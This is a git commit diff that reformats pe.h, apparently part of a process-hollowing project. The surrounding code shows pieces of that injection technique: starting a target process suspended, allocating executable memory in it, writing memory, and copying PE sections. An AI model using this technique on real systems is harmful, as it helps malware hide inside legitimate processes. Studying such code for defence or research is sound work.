7fe66ec21bf80069d049a08948b2522cd78629a6
scagliaa <loveaspetta3@gmail.com>
2023-10-04 11:53:14 +0200

    - reformatted one small thing

--- pe.h
+++ pe.h
@@ -23,7 +23,15 @@ namespace util {
         token_privileges.PrivilegeCount = 1;
         token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-        if (!AdjustTokenPrivileges(token, FALSE, &token_privileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
+        if (!AdjustTokenPrivileges(
+                    token,
+                    FALSE,
+                    &token_privileges,
+                    sizeof(TOKEN_PRIVILEGES),
+                    nullptr,
+                    nullptr)
+            )
+        {
             CloseHandle(token);
             return false;
         }
@@ -34,15 +42,15 @@ namespace util {
 }
 
 namespace process {
-    PIMAGE_NT_HEADERS64 get_nt_header(PIMAGE_DOS_HEADER dos_header) {
+    auto get_nt_header(PIMAGE_DOS_HEADER dos_header) {
         return reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_data + dos_header->e_lfanew);
     }
 
-    PIMAGE_SECTION_HEADER get_section_header(PIMAGE_DOS_HEADER dos_header) {
+    auto get_section_header(PIMAGE_DOS_HEADER dos_header) {
         return reinterpret_cast<PIMAGE_SECTION_HEADER>(raw_data + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
     }
 
-    std::optional<HMODULE> load_ntdll() {
+    auto load_ntdll() -> std::optional<HMODULE>  {
         HMODULE nt_dll = LoadLibraryA("ntdll.dll");
         if (!nt_dll) {
             return std::nullopt;
@@ -50,7 +58,7 @@ namespace process {
         return nt_dll;
     }
 
-    std::optional<NTQUERYINFOPROC> get_nt_query_info_process(HMODULE nt_dll) {
+    auto get_nt_query_info_process(HMODULE nt_dll) -> std::optional<NTQUERYINFOPROC> {
         auto nt_query_info_process = reinterpret_cast<NTQUERYINFOPROC>(GetProcAddress(nt_dll, "NtQueryInformationProcess"));
         if (!nt_query_info_process) {
             return std::nullopt;
@@ -62,7 +70,7 @@ namespace process {
         return nt_header->Signature == IMAGE_NT_SIGNATURE;
     }
 
-    std::optional<PROCESS_INFORMATION> create_suspended_process(const std::filesystem::path &exe_path) {
+    auto create_suspended_process(const std::filesystem::path &exe_path) -> std::optional<PROCESS_INFORMATION> {
         auto process_info = std::make_unique<PROCESS_INFORMATION>();
         STARTUPINFO si{sizeof(si)};
 
@@ -76,7 +84,7 @@ namespace process {
         return *process_info;
     }
 
-    std::optional<PVOID> allocate_memory_in_target_process(HANDLE process, SIZE_T size) {
+    auto allocate_memory_in_target_process(HANDLE process, SIZE_T size) -> std::optional<PVOID> {
         PVOID memory = VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!memory) {
             return std::nullopt;
@@ -85,7 +93,7 @@ namespace process {
     }
 
 
-    bool write_process_memory(HANDLE process, PVOID dest, const void *src, SIZE_T size) {
+    auto write_process_memory(HANDLE process, PVOID dest, const void *src, SIZE_T size) {
         SIZE_T bytes_written;
         if (!WriteProcessMemory(process, dest, src, size, &bytes_written) || bytes_written != size) {
             return false;
@@ -93,7 +101,7 @@ namespace process {
         return true;
     }
 
-    void write_sections(PIMAGE_SECTION_HEADER section_header, PVOID new_image_base, PIMAGE_NT_HEADERS nt_header, HANDLE process) {
+    auto write_sections(PIMAGE_SECTION_HEADER section_header, PVOID new_image_base, PIMAGE_NT_HEADERS nt_header, HANDLE process) {
         for (WORD i = 0; i < nt_header->FileHeader.NumberOfSections; ++i) {
             PVOID section_dest = reinterpret_cast<PBYTE>(new_image_base) + section_header[i].VirtualAddress;
             PVOID section_src = reinterpret_cast<PBYTE>(raw_data) + section_header[i].PointerToRawData;
@@ -105,4 +113,5 @@ namespace process {
         }
     }
 }
+
 #endif//PROCESS_HOLLOWING_PE_H
